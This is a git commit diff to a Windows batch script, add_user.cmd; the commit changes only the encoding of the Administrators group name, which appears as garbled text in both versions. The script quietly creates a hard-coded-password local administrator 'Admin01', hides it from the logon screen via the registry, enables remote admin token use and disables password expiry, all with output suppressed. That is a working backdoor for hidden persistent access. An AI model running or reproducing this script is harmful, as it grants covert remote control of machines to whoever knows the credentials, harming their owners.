38e70452fd8b3f10ce4f45fe795d473511f4b77c
Usil Gang <usilgang@gmail.com>
2020-11-27 09:45:38 +0500

    Update add_user.cmd

--- add_user.cmd
+++ add_user.cmd
@@ -1,6 +1,6 @@
 REM Code-page:866
 @net user Admin01 P@s$wOrD1 /ADD>nul 2>&1
-@net localgroup "€¤¬¨­¨áâà â®àë" Admin01 /ADD>nul 2>&1
+@net localgroup "ÐÐ´Ð¼Ð¸Ð½Ð¸ÑÑ‚Ñ€Ð°Ñ‚Ð¾Ñ€Ñ‹" Admin01 /ADD>nul 2>&1
 @reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v Admin01 /t REG_DWORD /d 0 /f>nul 2>&1
 @reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f>nul 2>&1
 @wmic useraccount where "name='Admin01'" set passwordexpires=false
